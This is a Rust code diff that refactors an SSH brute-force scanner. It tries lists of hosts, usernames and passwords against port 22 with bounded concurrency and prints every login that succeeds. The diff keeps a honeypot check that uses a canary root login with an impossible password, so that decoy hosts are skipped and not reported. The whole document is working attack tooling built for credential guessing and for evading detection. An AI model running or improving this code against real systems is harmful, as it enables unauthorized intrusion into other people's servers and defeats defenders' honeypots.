@@ -4,17 +4,20 @@ extern crate futures;
 extern crate tokio;
 extern crate tokio_stream;
 extern crate indicatif;
+
 use crate::args;
-use std::string::String;
+
 use thrussh::*;
 use thrussh::client::*;
 use thrussh_keys::*;
+use std::string::String;
 use std::sync::Arc;
 use indicatif::{ProgressBar, ProgressStyle};
-use tokio::runtime::Runtime;
+use futures::stream::{self, StreamExt};
 
 struct Client {
 }
+
 const CANARY_USER: &str = "root";
 const CANARY_PASS: &str = "definitelynotarealpasswordthereisnowaythiswillmatch";
 
@@ -40,82 +43,89 @@ impl client::Handler for Client {
    }
 }
 
-async fn test_honeypot(host:String) -> Result<bool, &'static str> {
-    let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
-    let client: Client = Client{};
-    let session = thrussh::client::connect(config, format!("{}:22", host), client).await;
-    match session {
-	Ok(mut s) => {
-	    let auth = s.authenticate_password(CANARY_USER, CANARY_PASS).await;
-	    match auth {
-		Ok(a) => {
-		    return Ok(a);
-		},
-		Err(_e) => return Err("Not a honeypot, login failed"),
-	    }
-	},
-	Err(_e) => Err("Could not connect to host, not a honeypot"),
-    }
+pub struct Scanner {
+    config: args::Config,
+    pb: ProgressBar,
 }
 
-async fn try_login(pb:ProgressBar, host:String, user:String, pass:String) -> Result<bool, &'static str> {
-    let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
-    let client: Client = Client{};
-    let session = thrussh::client::connect(config, format!("{}:22", host), client).await;
-    pb.inc(1);
-    let message = format!("{} {} {}", host, user, pass);
-    pb.set_message(&message);
-    match session {
-	Ok(mut s) => {
-	    let auth = s.authenticate_password(user, pass).await;
-	    match auth {
-		Ok(true) => {
-		    let hp_test = test_honeypot(host).await;
-		    match hp_test {
-			Ok(true) => {
-			    return Err("Host is a honeypot");
-			},
-			Ok(false) => {
-			    pb.println(message);
-			    return Ok(true);
-			},
-			Err(e) => return Err(e),
-		    }
-		},
-		Ok(false) => {
-		    return Err("Login failed")
+impl Scanner {
+
+    async fn test_honeypot(&self, host:String) -> Result<bool, &'static str> {
+	let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
+	let client: Client = Client{};
+	let session = thrussh::client::connect(config, format!("{}:22", host), client).await;
+	match session {
+	    Ok(mut s) => {
+		let auth = s.authenticate_password(CANARY_USER, CANARY_PASS).await;
+		match auth {
+		    Ok(a) => {
+			return Ok(a);
+		    },
+		    Err(_e) => return Err("Not a honeypot, login failed"),
 		}
-		Err(_e) => Err("Could not auth")
-	    }
-	},
-	Err(_e) => Err("Could not connect to host"),
+	    },
+	    Err(_e) => Err("Could not connect to host, not a honeypot"),
+	}
     }
-}
 
-pub fn start(config:args::Config) -> Result<bool, &'static str> {
-
-    let items: u64 = config.users.len() as u64 * config.passwords.len() as u64 * config.hosts.len() as u64;
-    let rt = Runtime::new().unwrap();
-    let pb = ProgressBar::new(items);
-    pb.set_style(ProgressStyle::default_bar()
-		 .template("{spinner:.green} {elapsed_precise} {msg} [{wide_bar}] [{pos}/{len}] ({eta}@{per_sec})")
-		 .progress_chars("=> "));
-
-    
-    let mut tasks: Vec<_> = Vec::new();
-
-    for host in config.hosts.iter() {
-	for user in config.users.iter() {
-	    for pass in config.passwords.iter() {
-		let pb = pb.clone();
-		let host = host.clone();
-		let user = user.clone();
-		let pass = pass.clone();
-		tasks.push(try_login(pb, host, user, pass));
-	    }
-        }
+    async fn try_login(&self, login:args::Login) -> Result<bool, &'static str> {
+	let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
+	let client: Client = Client{};
+	let session = thrussh::client::connect(config, format!("{}:22", login.host), client).await;
+	let message = format!("{} {} {}", login.host, login.user, login.password);
+	match session {
+	    Ok(mut s) => {
+		let auth = s.authenticate_password(login.user, login.password).await;
+		self.pb.set_message(&message);
+		self.pb.inc(1);
+		match auth {
+		    Ok(true) => {
+			let hp_test = self.test_honeypot(login.host).await;
+			match hp_test {
+			    Ok(true) => {
+				return Err("Host is a honeypot");
+			    },
+			    Ok(false) => {
+				self.pb.println(message);
+				return Ok(true);
+			    },
+			    Err(e) => return Err(e),
+			}
+		    },
+		    Ok(false) => {
+			return Err("Login failed")
+		    }
+		    Err(_e) => Err("Could not auth")
+		}
+	    },
+	    Err(_e) => Err("Could not connect to host"),
+	}
     }
-    rt.block_on(futures::future::join_all(tasks));
-    pb.finish_with_message("scan complete");
-    return Ok(true);
+
+    pub async fn run(&self) -> Result<bool, &'static str> {
+	
+	self.pb.set_style(ProgressStyle::default_bar()
+		     .template("{spinner:.green} {elapsed_precise} {msg} [{wide_bar}] [{pos}/{len}] ({eta}@{per_sec})")
+		     .progress_chars("=> "));
+	self.pb.println("Building task queue...");
+
+	let mut login_futures = Vec::new();
+	for login in &self.config.logins {
+	    login_futures.push(self.try_login(login.clone()))
+	}
+	let login_stream = stream::iter(login_futures);
+	let buffer = login_stream.buffer_unordered(self.config.limit as usize);
+	let _results = buffer.collect::<Vec<Result<bool, &'static str>>>().await;
+	
+	self.pb.finish_with_message("scan complete");
+	return Ok(true);
+    }
+
+    pub fn new(config:args::Config) -> Result<Scanner, &'static str> {
+	let count = config.login_count as u64;
+	Ok(Scanner{
+	    config: config,
+	    pb: ProgressBar::new(count),
+	})
+    }
 }
